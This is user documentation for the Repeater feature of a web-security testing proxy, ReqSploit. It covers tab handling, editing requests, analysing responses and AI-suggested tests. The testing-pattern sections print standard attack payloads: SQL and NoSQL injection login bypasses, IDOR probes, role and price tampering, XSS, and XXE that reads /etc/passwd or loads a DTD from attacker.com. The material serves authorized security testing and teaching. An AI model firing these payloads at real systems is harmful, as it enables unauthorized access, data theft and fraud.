# 🔁 Repeater - Manual Request Testing

**Master manual security testing with ReqSploit's powerful Repeater tool**

Repeater is your Swiss Army knife for manual web application testing. Send requests, modify parameters, analyze responses, and iterate until you find vulnerabilities.

---

## 📋 Table of Contents

1. [What is Repeater?](#what-is-repeater)
2. [Getting Started](#getting-started)
3. [Interface Overview](#interface-overview)
4. [Sending Requests](#sending-requests)
5. [Modifying Requests](#modifying-requests)
6. [Analyzing Responses](#analyzing-responses)
7. [AI-Powered Testing](#ai-powered-testing)
8. [Common Testing Patterns](#common-testing-patterns)
9. [Advanced Features](#advanced-features)
10. [Best Practices](#best-practices)

---

## What is Repeater?

**Repeater** allows you to manually test web applications by sending HTTP requests, modifying them, and analyzing responses in a controlled environment.

**Key Features:**
- 🔄 **Repeat requests** with modifications
- 📊 **Side-by-side** request/response comparison
- 🤖 **AI-generated** test suggestions
- 💾 **Save and organize** test cases
- 📑 **Multiple tabs** for parallel testing
- 🔍 **Deep response analysis** with search and highlighting

**When to use Repeater:**
- Manual vulnerability testing
- Authentication and authorization testing
- Parameter fuzzing and tampering
- Response analysis and debugging
- Proof-of-concept development
- Deep dive into specific requests

---

## Getting Started

### Sending a Request to Repeater

**Method 1: From Request History**
```
1. Go to Requests tab
2. Right-click any request
3. Select "Send to Repeater"
4. New Repeater tab opens automatically
```

**Method 2: From Intercept Mode**
```
1. Intercept a request
2. Click "Send to Repeater" button
3. Request opens in new Repeater tab
```

**Method 3: Manual Creation**
```
1. Click Repeater tab
2. Click "+" to create new tab
3. Manually type or paste request
```

### Your First Test

**Example:** Test SQL injection on login form

1. **Capture login request** in Request History
2. **Send to Repeater**
3. **Original request:**
   ```
   POST /api/auth/login HTTP/1.1
   Host: example.com
   Content-Type: application/json

   {"username": "admin", "password": "test123"}
   ```
4. **Modify username:**
   ```json
   {"username": "admin' OR '1'='1", "password": "test123"}
   ```
5. **Click Send** (Ctrl+Enter)
6. **Analyze response:**
   - ✅ **200 OK + token** = SQL injection vulnerability! 🚨
   - ❌ **401 Unauthorized** = Input is sanitized ✓

---

## Interface Overview

### Repeater Layout

```
┌─────────────────────────────────────────────────────────────┐
│  Tab 1: POST /api/login  |  Tab 2: GET /api/users  [+]      │
├──────────────────────────┬──────────────────────────────────┤
│  📤 REQUEST              │  📥 RESPONSE                      │
│                          │                                   │
│  POST /api/login HTTP/1.1│  HTTP/1.1 200 OK                 │
│  Host: example.com       │  Content-Type: application/json  │
│  Content-Type: app/json  │  Set-Cookie: session=abc...      │
│  Content-Length: 45      │  Content-Length: 234             │
│                          │                                   │
│  {                       │  {                                │
│    "username": "admin",  │    "success": true,               │
│    "password": "test123" │    "token": "eyJhbGci...",        │
│  }                       │    "user": {                      │
│                          │      "id": 123,                   │
│  [🚀 Send]               │      "role": "admin"              │
│  [🤖 AI Tests]           │    }                              │
│  [💾 Save]               │  }                                │
│  [📋 History]            │                                   │
│                          │  [🔍 Search] [📊 Analysis]        │
│                          │  Status: 200 | Time: 234ms        │
│                          │  Size: 1.2 KB                     │
└──────────────────────────┴──────────────────────────────────┘
```

### Tab Management

**Creating Tabs:**
- Click **[+]** button to create new tab
- Send requests from History or Intercept
- Duplicate existing tab: Right-click tab → Duplicate

**Organizing Tabs:**
- Rename tab: Right-click → Rename
- Close tab: Click **[×]** or Ctrl+W
- Reorder: Drag and drop tabs

**Tab Naming Best Practices:**
```
✅ GOOD:
- "Login - SQLi Test"
- "User Profile - IDOR"
- "Payment - Price Manipulation"

❌ BAD:
- "Tab 1"
- "POST Request"
- "Test"
```

---

## Sending Requests

### Basic Request Sending

**Keyboard Shortcut:** `Ctrl/Cmd + Enter`

```
┌──────────────────────────┐
│  POST /api/login         │
│  Host: example.com       │
│  Content-Type: app/json  │
│                          │
│  {"username": "admin"}   │
│                          │
│  [🚀 Send] ← Click or    │
│  Ctrl+Enter              │
└──────────────────────────┘
```

**What happens when you send:**
1. Request is sent to target server
2. Response is captured and displayed
3. Request is saved to history (within Repeater tab)
4. Response time and size are measured

### Request History (Within Tab)

**View previous requests in current tab:**
```
┌──────────────────────────────────────┐
│  [📋 History] ← Click to expand      │
│                                       │
│  1. 14:32:45 - 200 OK (234ms)        │
│     username: "admin"                │
│  2. 14:33:12 - 401 Unauthorized      │
│     username: "admin' OR '1'='1"     │
│  3. 14:33:45 - 200 OK (198ms)        │
│     username: "admin'--"             │
│                                       │
│  [Load Request] [Compare]            │
└──────────────────────────────────────┘
```

**History actions:**
- **Load Request**: Restore previous request to editor
- **Compare**: Compare two responses side-by-side
- **Export**: Export history to file

---

## Modifying Requests

### Editing Request Line

**Modify method, path, or HTTP version:**
```
Original:
GET /api/users/123 HTTP/1.1

Modified:
POST /api/users/123 HTTP/1.1      ← Changed method
PUT /api/users/456 HTTP/1.1       ← Changed ID
GET /api/users/123 HTTP/2.0       ← Changed version
```

### Editing Headers

**Add, modify, or remove headers:**
```
┌──────────────────────────────────────┐
│  Headers:                            │
│  ┌────────────────────────────────┐  │
│  │ Authorization: Bearer token123 │  │
│  │ Content-Type: application/json │  │
│  │ X-Custom-Header: test-value    │  │ ← Add new
│  └────────────────────────────────┘  │
│                                       │
│  [+ Add Header]                      │
└──────────────────────────────────────┘
```

**Common header modifications:**

| Header | Original | Modified | Test Purpose |
|--------|----------|----------|--------------|
| `Authorization` | `Bearer user_token` | `Bearer admin_token` | Auth bypass |
| `Content-Type` | `application/json` | `application/xml` | Parser confusion |
| `X-User-ID` | `123` | `456` | IDOR testing |
| `X-Forwarded-For` | (none) | `127.0.0.1` | IP bypass |
| `Referer` | `https://example.com` | `https://attacker.com` | CSRF testing |

### Editing Request Body

**JSON Editing:**
```json
Original:
{
  "username": "john",
  "email": "john@example.com"
}

Modified (add privileged field):
{
  "username": "john",
  "email": "john@example.com",
  "role": "admin",           ← New field
  "isAdmin": true            ← New field
}
```

**URL-encoded Editing:**
```
Original:
username=john&password=test123

Modified:
username=admin&password=test123&role=admin
```

**XML Editing:**
```xml
Original:
<user>
  <username>john</username>
  <email>john@example.com</email>
</user>

Modified (XXE injection):
<!DOCTYPE user [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user>
  <username>&xxe;</username>
  <email>john@example.com</email>
</user>
```

### Parameter Encoding

**Automatic encoding helpers:**
```
┌──────────────────────────────────────┐
│  Value: admin' OR '1'='1             │
│                                       │
│  Encode as:                          │
│  [URL] [Base64] [HTML] [Unicode]     │
│                                       │
│  Result (URL):                       │
│  admin%27+OR+%271%27%3D%271          │
└──────────────────────────────────────┘
```

---

## Analyzing Responses

### Response Panel Features

**View Modes:**
```
┌──────────────────────────────────────┐
│  [Pretty] [Raw] [Hex] [Headers]      │
│                                       │
│  Pretty View (formatted):            │
│  {                                    │
│    "success": true,                  │
│    "data": {...}                     │
│  }                                    │
│                                       │
│  Raw View (unformatted):             │
│  {"success":true,"data":{...}}       │
│                                       │
│  Hex View (hexadecimal):             │
│  7B 22 73 75 63 63 65 73 73 ...      │
└──────────────────────────────────────┘
```

### Response Search

**Search within response:**
```
┌──────────────────────────────────────┐
│  [🔍 Search...]                      │
│  ↓ Match 1 of 5 ↑                    │
│                                       │
│  {                                    │
│    "users": [                        │
│      {"id": 123, "name": "admin"},   │ ← Highlighted
│      {"id": 456, "name": "user"}     │
│    ]                                  │
│  }                                    │
│                                       │
│  [✓] Case sensitive                  │
│  [✓] Regex mode                      │
└──────────────────────────────────────┘
```

**Common search patterns:**

| Search | Purpose |
|--------|---------|
| `"admin"` | Find admin references |
| `"error"` | Find error messages |
| `"token"` | Find authentication tokens |
| `/\b[A-Z0-9]{20,}\b/` | Find potential secrets (regex) |
| `"password"` | Find password fields |

### Response Comparison

**Compare two responses:**
```
┌──────────────────────────────────────┐
│  [Compare Mode]                      │
│                                       │
│  Response 1 (user)  │ Response 2 (admin) │
│  ──────────────────────────────────  │
│  {                  │ {                │
│    "role": "user",  │   "role": "admin", │ ← Different
│    "access": [      │   "access": [      │
│      "read"         │     "read",        │
│    ]                │     "write",       │ ← Different
│  }                  │     "delete"       │ ← Different
│                     │   ]                │
│                     │ }                  │
│                                       │
│  Differences: 3                      │
└──────────────────────────────────────┘
```

### Response Metrics

**Analyze performance and behavior:**
```
┌──────────────────────────────────────┐
│  📊 Response Metrics                 │
│                                       │
│  Status: 200 OK                      │
│  Time: 234ms                         │
│  Size: 1.2 KB                        │
│  Headers: 12                         │
│                                       │
│  ⏱️ Timing Breakdown:                │
│  - DNS:        15ms                  │
│  - Connect:    28ms                  │
│  - TLS:        45ms                  │
│  - Wait:       120ms (server)        │
│  - Download:   26ms                  │
│                                       │
│  🔍 Content Analysis:                │
│  - Content-Type: application/json    │
│  - Encoding: gzip                    │
│  - Lines: 45                         │
│  - Words: 234                        │
└──────────────────────────────────────┘
```

---

## AI-Powered Testing

### Getting AI Test Suggestions

**Click "🤖 AI Tests" button:**
```
┌──────────────────────────────────────────────────┐
│  🤖 AI TEST SUGGESTIONS (8)                      │
│  Model: Haiku 4.5 (~3K tokens)                   │
├──────────────────────────────────────────────────┤
│  1. 🎯 IDOR - User ID Enumeration                │
│     Modify: userId "123" → "124", "125", ...     │
│     Expected: 403 Forbidden or different data    │
│     Risk: HIGH - Access other users' data        │
│     [Apply] [Send to Intruder]                   │
│  ──────────────────────────────────────────────  │
│  2. 💉 SQL Injection in Search Parameter         │
│     Modify: search "test" → "test' OR '1'='1"    │
│     Expected: 500 Error or unexpected behavior   │
│     Risk: CRITICAL - Database compromise         │
│     [Apply] [Send to Intruder]                   │
│  ──────────────────────────────────────────────  │
│  3. 🔓 Privilege Escalation via Role Field       │
│     Add: "role": "admin" to request body         │
│     Expected: 200 OK with elevated privileges    │
│     Risk: CRITICAL - Gain admin access           │
│     [Apply] [Send to Intruder]                   │
│  ──────────────────────────────────────────────  │
│  4. 🌐 XSS in Username Field                     │
│     Modify: username → "<script>alert(1)</...    │
│     Expected: Script reflected in response       │
│     Risk: HIGH - Client-side code execution      │
│     [Apply] [Send to Intruder]                   │
│  ──────────────────────────────────────────────  │
│  [Load More] [Export Suggestions]                │
└──────────────────────────────────────────────────┘
```

### Applying AI Suggestions

**One-click application:**
1. Click **[Apply]** on any suggestion
2. Request is automatically modified
3. Click **[Send]** to test
4. Analyze response

**Send to Intruder:**
1. Click **[Send to Intruder]** on suggestion
2. New Intruder tab opens with:
   - Positions marked
   - Payloads pre-configured
   - Attack type selected
3. Click **Start Attack** to automate

---

## Common Testing Patterns

### Pattern 1: Authentication Testing

**Test login vulnerabilities:**

```
1. Original Login Request:
   POST /api/auth/login
   {"username": "admin", "password": "test123"}

2. SQL Injection Tests:
   {"username": "admin' OR '1'='1", "password": "anything"}
   {"username": "admin'--", "password": ""}
   {"username": "admin' /*", "password": "*/"}

3. NoSQL Injection Tests:
   {"username": {"$ne": null}, "password": {"$ne": null}}
   {"username": {"$gt": ""}, "password": {"$gt": ""}}

4. Authentication Bypass Tests:
   {"username": "admin", "password": ""}  (empty password)
   {"username": "admin"}  (missing password field)
   {"username": "", "password": ""}  (both empty)

5. Special Characters:
   {"username": "admin\u0000", "password": "test123"}  (null byte)
   {"username": "admin\r\n", "password": "test123"}  (CRLF)
```

**What to look for:**
- ✅ 200 OK with valid token = Vulnerability found!
- ✅ Different error message = Info disclosure
- ✅ Timing differences = Potential username enumeration
- ❌ 401 Unauthorized = Properly secured

---

### Pattern 2: IDOR Testing

**Test object-level authorization:**

```
1. Original Request:
   GET /api/users/123/profile

2. Sequential ID Tests:
   GET /api/users/124/profile
   GET /api/users/125/profile
   GET /api/users/1/profile  (often admin)

3. Special ID Tests:
   GET /api/users/0/profile
   GET /api/users/-1/profile
   GET /api/users/999999/profile

4. UUID Tests (if using UUIDs):
   GET /api/users/00000000-0000-0000-0000-000000000000/profile
   GET /api/users/aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa/profile

5. Wildcard Tests:
   GET /api/users/*/profile
   GET /api/users/all/profile
```

**What to look for:**
- ✅ 200 OK with different user data = IDOR vulnerability!
- ✅ 200 OK with your own data = Server-side filtering (still test thoroughly)
- ❌ 403 Forbidden = Proper authorization
- ❌ 404 Not Found = User doesn't exist or proper security

---

### Pattern 3: Privilege Escalation

**Test role-based access control:**

```
1. Original Request (regular user):
   POST /api/users/123/update
   {"email": "user@example.com"}

2. Add Privileged Fields:
   {"email": "user@example.com", "role": "admin"}
   {"email": "user@example.com", "isAdmin": true}
   {"email": "user@example.com", "permissions": ["*"]}

3. Modify Hidden Fields:
   {"email": "user@example.com", "accountType": "premium"}
   {"email": "user@example.com", "credits": 999999}

4. Array Manipulation:
   {"email": "user@example.com", "roles": ["admin", "superuser"]}

5. Nested Object Injection:
   {
     "email": "user@example.com",
     "settings": {
       "role": "admin",
       "level": 99
     }
   }
```

**Verification:**
1. Send modified request
2. Log out and log back in
3. Check your actual permissions
4. Try accessing admin endpoints

---

### Pattern 4: Price Manipulation

**Test e-commerce security:**

```
1. Original Purchase Request:
   POST /api/checkout
   {
     "items": [
       {"id": "prod-123", "price": 99.99, "quantity": 1}
     ]
   }

2. Price Modification Tests:
   {"id": "prod-123", "price": 0.01, "quantity": 1}  (near-zero)
   {"id": "prod-123", "price": -99.99, "quantity": 1}  (negative)
   {"id": "prod-123", "quantity": 1}  (remove price)

3. Quantity Tests:
   {"id": "prod-123", "price": 99.99, "quantity": -1}  (negative)
   {"id": "prod-123", "price": 99.99, "quantity": 0}  (zero)

4. Calculation Bypass:
   {
     "items": [...],
     "total": 0.01,  ← Override calculated total
     "discount": 99.98
   }

5. Currency Manipulation:
   {"id": "prod-123", "price": 99.99, "currency": "JPY"}  (100 JPY = $0.67)
```

**What to look for:**
- ✅ Order completes with manipulated price = Critical vulnerability!
- ✅ Server accepts modified total = Business logic flaw
- ❌ Server recalculates total = Properly secured

---

### Pattern 5: XXE Injection

**Test XML External Entity vulnerabilities:**

```
1. Original XML Request:
   POST /api/process-xml
   Content-Type: application/xml

   <user>
     <name>John</name>
     <email>john@example.com</email>
   </user>

2. XXE File Read:
   <!DOCTYPE user [
     <!ENTITY xxe SYSTEM "file:///etc/passwd">
   ]>
   <user>
     <name>&xxe;</name>
     <email>john@example.com</email>
   </user>

3. XXE SSRF:
   <!DOCTYPE user [
     <!ENTITY xxe SYSTEM "http://internal-server/admin">
   ]>
   <user>
     <name>&xxe;</name>
   </user>

4. XXE Blind (Out-of-Band):
   <!DOCTYPE user [
     <!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">
     %remote;
   ]>
   <user><name>test</name></user>
```

**What to look for:**
- ✅ File contents in response = XXE vulnerability!
- ✅ Server makes external request = SSRF via XXE
- ❌ Error or sanitized response = XML parser is secured

---

## Advanced Features

### Request Chaining

**Use response from one request in another:**

```
Step 1: Login
┌──────────────────────────────────────┐
│ POST /api/auth/login                 │
│ {"username": "admin", "password": ...│
│                                       │
│ Response:                            │
│ {"token": "eyJhbGci...xyz"}          │ ← Copy token
└──────────────────────────────────────┘

Step 2: Use Token in Next Request
┌──────────────────────────────────────┐
│ GET /api/admin/users                 │
│ Authorization: Bearer eyJhbGci...xyz │ ← Paste token
│                                       │
│ Response: [...user list...]          │
└──────────────────────────────────────┘
```

**Auto-extraction (coming soon):**
- Automatically extract tokens, IDs, cookies
- Chain requests with variables: `${token}`, `${userId}`

### Request Templates

**Save common requests as templates:**

```
┌──────────────────────────────────────┐
│  💾 SAVED TEMPLATES                  │
│                                       │
│  • SQL Injection - Login Form        │
│  • IDOR Test - User Profile          │
│  • XSS - Search Parameter            │
│  • XXE - XML Upload                  │
│  • SSRF - URL Parameter              │
│                                       │
│  [+ New Template] [Import] [Export]  │
└──────────────────────────────────────┘
```

### Macros and Automation

**Record and replay request sequences:**

```
┌──────────────────────────────────────┐
│  🎬 MACRO: "Admin Login & User CRUD" │
│                                       │
│  1. POST /api/auth/login             │
│     Extract: token → ${authToken}    │
│  2. GET /api/users (use ${authToken})│
│     Extract: users[0].id → ${userId} │
│  3. PUT /api/users/${userId}         │
│  4. DELETE /api/users/${userId}      │
│                                       │
│  [▶️ Run Macro] [Edit] [Export]      │
└──────────────────────────────────────┘
```

---

## Best Practices

### 1. Organize Your Tabs
```
✅ DO:
- Use descriptive tab names
- Close tabs when done testing
- Group related tests in project

❌ DON'T:
- Keep 50+ tabs open
- Use generic names like "Tab 1"
```

### 2. Document Your Findings
```
✅ DO:
- Take notes in tab
- Save successful PoC requests
- Export important findings

❌ DON'T:
- Forget what you tested
- Lose track of vulnerabilities found
```

### 3. Test Incrementally
```
✅ DO:
- Change one parameter at a time
- Compare responses carefully
- Build on successful tests

❌ DON'T:
- Change everything at once
- Ignore subtle response differences
```

### 4. Use AI Wisely
```
✅ DO:
- Use AI for test ideas
- Verify AI suggestions manually
- Learn from AI recommendations

❌ DON'T:
- Blindly trust AI results
- Skip manual verification
```

### 5. Respect Rate Limits
```
✅ DO:
- Add delays between requests
- Respect server resources
- Use Intruder for mass testing

❌ DON'T:
- Spam servers with requests
- DDoS target applications
```

---

## Next Steps

Now that you've mastered Repeater:

1. ✅ **[Learn Intruder](./intruder.md)** - Automated fuzzing and payload injection
2. ✅ **[Use AI Features](../ai-features/payload-generator.md)** - Generate custom payloads
3. ✅ **[Complete Tutorial](../tutorials/testing-rest-api.md)** - Real-world REST API testing
4. ✅ **[Explore Magic Scan](./magic-scan.md)** - Automatic sensitive data detection

---

**Need Help?** Check the [FAQ](../troubleshooting/faq.md) or [contact support](mailto:support@reqsploit.com).

**Ready to automate?** Learn about [Intruder Mode](./intruder.md) next.
